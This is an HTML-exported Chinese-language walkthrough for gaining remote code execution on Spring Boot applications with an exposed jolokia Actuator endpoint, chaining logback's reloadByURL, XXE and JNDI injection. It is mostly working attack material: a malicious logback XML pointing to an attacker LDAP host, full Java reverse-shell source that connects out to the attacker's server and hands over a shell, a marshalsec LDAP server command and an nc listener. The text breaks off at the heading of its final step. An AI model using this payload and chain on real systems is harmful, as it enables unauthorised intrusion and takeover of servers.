<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs24C36B3{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.csC5F53424{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:italic;}
			.cs86A93FFD{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:italic;}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="X9e4bffe8412a5cac31da85977574ba4954ece15"><span class="csDE05BCC">Spring Boot Actuator jolokia </span><span class="csECDA2D3">配置不当导致的</span><span class="csDE05BCC">rce</span><span class="csECDA2D3">漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h3 class="cs868C439D">
			<a name="利用条件"><span class="csD6CA00D2">利用条件：</span></a></h3>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">目标网站存在</span><span class="cs8926E06"> /jolokia </span><span class="cs9C1B1871">或</span><span class="cs8926E06"> /actuator/jolokia </span><span class="cs9C1B1871">接口</span></li><li class="cs24C36B3"><span class="cs9C1B1871">目标使用了</span><span class="cs8926E06"> jolokia-core </span><span class="cs9C1B1871">依赖（版本要求暂未知）并且环境中存在相关</span><span class="cs8926E06"> MBean</span></li><li class="cs24C36B3"><span class="cs9C1B1871">目标可以请求攻击者的</span><span class="cs8926E06"> HTTP </span><span class="cs9C1B1871">服务器（请求可出外网）</span></li><li class="cs24C36B3"><span class="cs8926E06">ldap </span><span class="cs9C1B1871">注入可能会受目标</span><span class="cs8926E06"> JDK </span><span class="cs9C1B1871">版本影响，</span><span class="cs8926E06">jdk &lt; 6u201/7u191/8u182/11.0.1</span></li></ul>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞原理"><span class="csD6CA00D2">漏洞原理</span></a></h3>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">直接访问可触发漏洞的</span><span class="cs8926E06"> URL</span><span class="cs9C1B1871">，相当于通过</span><span class="cs8926E06"> jolokia </span><span class="cs9C1B1871">调用</span><span class="cs8926E06"> ch.qos.logback.classic.jmx.JMXConfigurator </span><span class="cs9C1B1871">类的</span><span class="cs8926E06"> reloadByURL </span><span class="cs9C1B1871">方法</span></li><li class="cs24C36B3"><span class="cs9C1B1871">目标机器请求外部日志配置文件</span><span class="cs8926E06"> URL </span><span class="cs9C1B1871">地址，获得恶意</span><span class="cs8926E06"> xml </span><span class="cs9C1B1871">文件内容</span></li><li class="cs24C36B3"><span class="cs9C1B1871">目标机器使用</span><span class="cs8926E06"> saxParser.parse </span><span class="cs9C1B1871">解析</span><span class="cs8926E06"> xml </span><span class="cs9C1B1871">文件</span><span class="cs8926E06"> (</span><span class="cs9C1B1871">这里导致了</span><span class="cs8926E06"> xxe </span><span class="cs9C1B1871">漏洞</span><span class="cs8926E06">)</span></li><li class="cs24C36B3"><span class="cs8926E06">xml </span><span class="cs9C1B1871">文件中利用</span><span class="cs8926E06"> logback </span><span class="cs9C1B1871">依赖的</span><span class="cs8926E06"> insertFormJNDI </span><span class="cs9C1B1871">标签，设置了外部</span><span class="cs8926E06"> JNDI </span><span class="cs9C1B1871">服务器地址</span></li><li class="cs24C36B3"><span class="cs9C1B1871">目标机器请求恶意</span><span class="cs8926E06"> JNDI </span><span class="cs9C1B1871">服务器，导致</span><span class="cs8926E06"> JNDI </span><span class="cs9C1B1871">注入，造成</span><span class="cs8926E06"> RCE </span><span class="cs9C1B1871">漏洞</span></li></ul>
		<h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<h3 class="cs868C439D">
			<a name="步骤一查看已存在的-mbeans"><span class="csD6CA00D2">步骤一：查看已存在的</span><span class="csD1E291E2"> MBeans</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">访问</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">/jolokia/list</span><span class="cs8926E06"> </span><span class="cs9C1B1871">接口，查看是否存在</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">ch.qos.logback.classic.jmx.JMXConfigurator</span><span class="cs8926E06"> </span><span class="cs9C1B1871">和</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">reloadByURL</span><span class="cs8926E06"> </span><span class="cs9C1B1871">关键词。</span><span class="cs8926E06"><br/><img src="Web安全/Spring_Boot/Spring%20Boot%20Actuator%20jolokia%20%e9%85%8d%e7%bd%ae%e4%b8%8d%e5%bd%93%e5%af%bc%e8%87%b4%e7%9a%84rce%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="152" alt="" style="border-width:0px;" /><br/><img src="Web安全/Spring_Boot/Spring%20Boot%20Actuator%20jolokia%20%e9%85%8d%e7%bd%ae%e4%b8%8d%e5%bd%93%e5%af%bc%e8%87%b4%e7%9a%84rce%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="291" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="步骤二托管-xml-文件"><span class="csD6CA00D2">步骤二：托管</span><span class="csD1E291E2"> xml </span><span class="csD6CA00D2">文件</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">在自己控制的</span><span class="cs8926E06"> vps </span><span class="cs9C1B1871">机器上开启一个简单</span><span class="cs8926E06"> HTTP </span><span class="cs9C1B1871">服务器，端口尽量使用常见</span><span class="cs8926E06"> HTTP </span><span class="cs9C1B1871">服务端口（</span><span class="cs8926E06">80</span><span class="cs9C1B1871">、</span><span class="cs8926E06">443</span><span class="cs9C1B1871">）</span></p><p class="cs3A447A38"><span class="cs7FFD2630">使用</span><span class="cs9FB05234"> python </span><span class="cs7FFD2630">快速开启</span><span class="cs9FB05234"> http server</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">python2 -m SimpleHTTPServer 80</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">python3 -m http.server 80</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在根目录放置以</span><span class="cs8926E06"> xml </span><span class="cs9C1B1871">结尾的</span><span class="cs8926E06"> ian.xml </span><span class="cs9C1B1871">文件，内容如下：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;configuration&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&lt;insertFromJNDI env-entry-name=&quot;ldap://your-vps-ip:1389/JNDIObject&quot; as=&quot;appName&quot; /&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/configuration&gt;</span></p><h3 class="cs868C439D">
			<a name="步骤三准备要执行的-java-代码"><span class="csD6CA00D2">步骤三：准备要执行的</span><span class="csD1E291E2"> Java </span><span class="csD6CA00D2">代码</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">使用兼容低版本</span><span class="cs8926E06"> jdk </span><span class="cs9C1B1871">的方式编译：</span></p><p class="cs3A447A38"><span class="cs9FB05234">javac -source 1.5 -target 1.5 JNDIObject.java</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后将生成的</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">JNDIObject.class</span><span class="cs8926E06"> </span><span class="cs9C1B1871">文件拷贝到刚刚用</span><span class="cs8926E06">py</span><span class="cs9C1B1871">开启的网站根目录。</span></p><p class="cs3A447A38"><span class="cs9FB05234">JNDIObject.java //</span><span class="cs7FFD2630">请自行修改代码中反弹</span><span class="cs9FB05234">shell</span><span class="cs7FFD2630">的</span><span class="cs9FB05234">ip</span><span class="cs7FFD2630">和端口</span></p><p class="cs3A447A38"><span class="cs9FB05234">/**</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> * &nbsp;javac -source 1.5 -target 1.5 JNDIObject.java</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> *</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> * &nbsp;Build By LandGrey</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> * */</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import java.io.File;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import java.io.InputStream;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import java.io.OutputStream;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import java.net.Socket;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">public class JNDIObject {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;static {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String ip = &quot;your-vps-ip&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String port = &quot;443&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String py_path = null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String[] cmd;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (!System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;windows&quot;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String[] py_envs = new String[]{&quot;/bin/python&quot;, &quot;/bin/python3&quot;, &quot;/usr/bin/python&quot;, &quot;/usr/bin/python3&quot;, &quot;/usr/local/bin/python&quot;, &quot;/usr/local/bin/python3&quot;};</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(int i = 0; i &lt; py_envs.length; ++i) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String py = py_envs[i];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ((new File(py)).exists()) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;py_path = py;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (py_path != null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ((new File(&quot;/bin/bash&quot;)).exists()) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmd = new String[]{py_path, &quot;-c&quot;, &quot;import pty;pty.spawn(\&quot;/bin/bash\&quot;)&quot;};</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmd = new String[]{py_path, &quot;-c&quot;, &quot;import pty;pty.spawn(\&quot;/bin/sh\&quot;)&quot;};</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ((new File(&quot;/bin/bash&quot;)).exists()) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmd = new String[]{&quot;/bin/bash&quot;};</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmd = new String[]{&quot;/bin/sh&quot;};</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmd = new String[]{&quot;cmd.exe&quot;};</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Process p = (new ProcessBuilder(cmd)).redirectErrorStream(true).start();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Socket s = new Socket(ip, Integer.parseInt(port));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;InputStream pi = p.getInputStream();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;InputStream pe = p.getErrorStream();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;InputStream si = s.getInputStream();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OutputStream po = p.getOutputStream();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OutputStream so = s.getOutputStream();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while(!s.isClosed()) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while(pi.available() &gt; 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;so.write(pi.read());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while(pe.available() &gt; 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;so.write(pe.read());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while(si.available() &gt; 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;po.write(si.read());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;so.flush();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;po.flush();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Thread.sleep(50L);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p.exitValue();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} catch (Exception e) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p.destroy();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s.close();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}catch (Throwable e){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;e.printStackTrace();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Spring_Boot/Spring%20Boot%20Actuator%20jolokia%20%e9%85%8d%e7%bd%ae%e4%b8%8d%e5%bd%93%e5%af%bc%e8%87%b4%e7%9a%84rce%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="65" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="步骤四架设恶意-ldap-服务"><span class="csD6CA00D2">步骤四：架设恶意</span><span class="csD1E291E2"> ldap </span><span class="csD6CA00D2">服务</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">下载</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">marshalsec</span><span class="cs8926E06"> </span><span class="cs9C1B1871">，使用下面命令架设对应的</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">ldap</span><span class="cs8926E06"> </span><span class="cs9C1B1871">服务：</span></p><p class="cs3A447A38"><span class="cs9FB05234">https://github.com/ianxtianxt/marshalsec</span></p><p class="cs40DD2BC9"><span class="csC5F53424">ps:</span><span class="cs86A93FFD">我这里发的是源码，需要用</span><span class="csC5F53424">mvn</span><span class="cs86A93FFD">编译</span><span class="csC5F53424">marshalsec</span></p><p class="cs3A447A38"><span class="cs9FB05234">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389</span></p><h3 class="cs868C439D">
			<a name="步骤五监听反弹-shell-的端口"><span class="csD6CA00D2">步骤五：监听反弹</span><span class="csD1E291E2"> shell </span><span class="csD6CA00D2">的端口</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">nc -lvvp </span><span class="cs7FFD2630">你上一步代码里设置的端口</span></p><h3 class="cs868C439D">
			<a name="步骤六从外部-url-地址加载日志配置文件"><span class="csD6CA00D2">步骤六：从外部</span><span class="csD1E291E2"> URL </span><span class="csD6CA00D2">地址加载日志配置文件</span></a></h3>
